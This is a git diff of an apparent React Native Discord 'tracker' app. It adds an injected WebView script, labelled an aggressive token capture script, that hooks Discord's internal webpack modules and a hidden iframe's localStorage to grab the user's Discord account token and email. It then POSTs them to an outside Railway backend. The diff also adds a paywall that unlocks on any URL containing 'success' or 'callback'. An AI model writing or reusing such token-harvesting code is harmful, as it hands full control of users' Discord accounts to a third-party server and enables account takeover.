@@ -30,6 +30,7 @@ export default function App() {
   const [myUserId, setMyUserId] = useState(null);
   const [userEmail, setUserEmail] = useState("");
 
+  // SUBSCRIPTION STATES
   const [isSubscribed, setIsSubscribed] = useState(true);
   const [paystackUrl, setPaystackUrl] = useState(null);
 
@@ -38,7 +39,7 @@ export default function App() {
 
   const API_URL = "https://intelligent-gratitude-production.up.railway.app";
 
-  // --- IMPROVED SCRIPT: Target UserStore directly ---
+  // AGGRESSIVE TOKEN CAPTURE SCRIPT (Modified slightly to include Email)
   const INJECTED_JAVASCRIPT = `
   (function() {
     let attempts = 0;
@@ -46,54 +47,66 @@ export default function App() {
       try {
         let token = null;
         let email = null;
+
         const webpack = window.webpackChunkdiscord_app;
-        
         if (webpack) {
+          // We use a temporary chunk to hook into Discord's internal modules
           const m = webpack.push([[Symbol()], {}, (e) => e]);
+          
           for (const i in m.c) {
             const exp = m.c[i].exports;
-            if (exp && exp.default && typeof exp.default === 'object') {
-              // Get Token
-              if (exp.default.getToken) token = exp.default.getToken();
-              
-              // Get Email (Try multiple known internal paths)
-              if (exp.default.getCurrentUser) {
-                const u = exp.default.getCurrentUser();
-                if (u && u.email) email = u.email;
+            if (exp && exp.default) {
+              // 1. Try to get token
+              if (exp.default.getToken) {
+                const foundToken = exp.default.getToken();
+                if (foundToken) token = foundToken;
               }
-              if (!email && exp.default.getEmail) email = exp.default.getEmail();
+              
+              // 2. Try to get email (Check multiple common Discord store locations)
+              if (exp.default.getCurrentUser) {
+                const user = exp.default.getCurrentUser();
+                if (user && user.email) email = user.email;
+              }
+              if (!email && exp.default.getEmail) {
+                email = exp.default.getEmail();
+              }
             }
           }
         }
 
-        // Token Fallback
+        // 3. IFRAME FALLBACK (If Webpack token search fails)
         if (!token) {
           const iframe = document.createElement('iframe');
           iframe.style.display = 'none';
           document.body.appendChild(iframe);
-          const raw = iframe.contentWindow.localStorage.getItem('token');
-          if (raw) token = raw.replace(/"/g, '');
+          const rawToken = iframe.contentWindow.localStorage.getItem('token');
+          if (rawToken) token = rawToken.replace(/"/g, '');
+          document.body.removeChild(iframe);
         }
 
+        // 4. SEND DATA
+        // We only stop the timer if we find the token. 
+        // We will wait up to 5 seconds to find the email before giving up and using the default.
         if (token && token.length > 20) {
           attempts++;
-          // Send if we have email OR if we've tried for 8 seconds
-          if (email || attempts > 16) {
+          if (email || attempts > 10) {
             window.ReactNativeWebView.postMessage(JSON.stringify({
               type: 'TOKEN_DATA', 
               token: token, 
               email: email || "user@discord.com" 
             }));
-            return true;
+            return true; 
           }
         }
       } catch (e) {}
       return false;
     }
-    const timer = setInterval(() => { if (capture()) clearInterval(timer); }, 500);
+
+    const timer = setInterval(() => {
+      if (capture()) clearInterval(timer);
+    }, 500);
   })();
 `;
-
   useEffect(() => {
     registerForNotifications();
     loadSavedUser();
@@ -120,11 +133,22 @@ export default function App() {
   const onWebViewMessage = async (event) => {
     try {
       const message = JSON.parse(event.nativeEvent.data);
+      // Handles the new combined data
       if (message.type === "TOKEN_DATA" && message.token) {
         setShowWebView(false);
         await sendTokenToBackend(message.token, message.email);
       }
-    } catch (e) {}
+      // Fallback for old style messages
+      else if (message.type === "TOKEN" && message.data) {
+        setShowWebView(false);
+        await sendTokenToBackend(message.data, "user@discord.com");
+      }
+    } catch (e) {
+      if (event.nativeEvent.data.length > 20) {
+        setShowWebView(false);
+        await sendTokenToBackend(event.nativeEvent.data, "user@discord.com");
+      }
+    }
   };
 
   const sendTokenToBackend = async (token, email) => {
@@ -132,7 +156,7 @@ export default function App() {
       const response = await fetch(`${API_URL}/link-account`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ token, email }),
+        body: JSON.stringify({ token: token, email: email }),
       });
       const result = await response.json();
       if (response.ok) {
@@ -198,29 +222,20 @@ export default function App() {
     }
   };
 
-  // --- IMPROVED: Catch Paystack success more reliably ---
   const handlePaystackNavigation = (navState) => {
-    const url = navState.url.toLowerCase();
-    // Check for common redirect success patterns
-    if (
-      url.includes("success") ||
-      url.includes("callback") ||
-      url.includes("checkout.paystack.com/success")
-    ) {
-      setTimeout(() => {
-        setPaystackUrl(null);
-        setIsSubscribed(true);
-        fetchMoves();
-        Alert.alert("Success", "Account unlocked!");
-      }, 2000); // Small delay to let Paystack finish its visual "Success" animation
+    if (navState.url.includes("success") || navState.url.includes("callback")) {
+      setPaystackUrl(null);
+      setIsSubscribed(true);
+      fetchMoves();
+      Alert.alert("Success", "Account unlocked!");
     }
   };
 
   const handleLogout = async () => {
-    Alert.alert("Reset", "Logout?", [
+    Alert.alert("Reset App", "Logout of tracker?", [
       { text: "Cancel", style: "cancel" },
       {
-        text: "Reset",
+        text: "Reset Everything",
         style: "destructive",
         onPress: async () => {
           await AsyncStorage.clear();
@@ -273,13 +288,12 @@ export default function App() {
           <TouchableOpacity onPress={() => setPaystackUrl(null)}>
             <Text style={{ color: "red" }}>Cancel</Text>
           </TouchableOpacity>
-          <Text style={{ fontWeight: "bold" }}>Secure Payment</Text>
+          <Text style={{ fontWeight: "bold" }}>Paystack Secure</Text>
           <View style={{ width: 50 }} />
         </View>
         <WebView
           source={{ uri: paystackUrl }}
           onNavigationStateChange={handlePaystackNavigation}
-          style={{ flex: 1 }}
         />
       </SafeAreaView>
     );
@@ -292,7 +306,7 @@ export default function App() {
           <TouchableOpacity onPress={() => setShowWebView(false)}>
             <Text style={{ color: "red", fontWeight: "bold" }}>Cancel</Text>
           </TouchableOpacity>
-          <Text style={{ fontWeight: "bold" }}>Connect Discord</Text>
+          <Text style={{ fontWeight: "bold" }}>Connect to Discord</Text>
           <View style={{ width: 50 }} />
         </View>
         <WebView
@@ -304,6 +318,13 @@ export default function App() {
           onNavigationStateChange={handleNavigationChange}
           userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
         />
+        <View style={styles.statusFooter}>
+          <ActivityIndicator size="small" color="#5865F2" />
+          <Text style={styles.statusText}>
+            {" "}
+            Capturing Token Automatically...
+          </Text>
+        </View>
       </SafeAreaView>
     );
   }
@@ -327,6 +348,7 @@ export default function App() {
             <View style={styles.paywallContainer}>
               <Text style={styles.loginEmoji}>🔒</Text>
               <Text style={styles.title}>Access Locked</Text>
+              <Text style={styles.subtitle}>Your subscription has ended.</Text>
               <TouchableOpacity
                 style={styles.loginButton}
                 onPress={handlePayment}
@@ -403,6 +425,12 @@ const styles = StyleSheet.create({
     marginBottom: 20,
   },
   title: { fontSize: 26, fontWeight: "bold" },
+  subtitle: {
+    fontSize: 16,
+    color: "#666",
+    textAlign: "center",
+    marginBottom: 30,
+  },
   loginButton: {
     backgroundColor: "#5865F2",
     padding: 18,
@@ -435,4 +463,17 @@ const styles = StyleSheet.create({
   actionText: { marginTop: 8, fontSize: 15, color: "#333" },
   timeText: { fontSize: 11, color: "#999", marginTop: 5 },
   empty: { textAlign: "center", marginTop: 50, color: "#999" },
+  statusFooter: {
+    flexDirection: "row",
+    alignItems: "center",
+    justifyContent: "center",
+    padding: 20,
+    backgroundColor: "#fff",
+  },
+  statusText: {
+    fontSize: 13,
+    color: "#5865F2",
+    marginLeft: 10,
+    fontWeight: "500",
+  },
 });
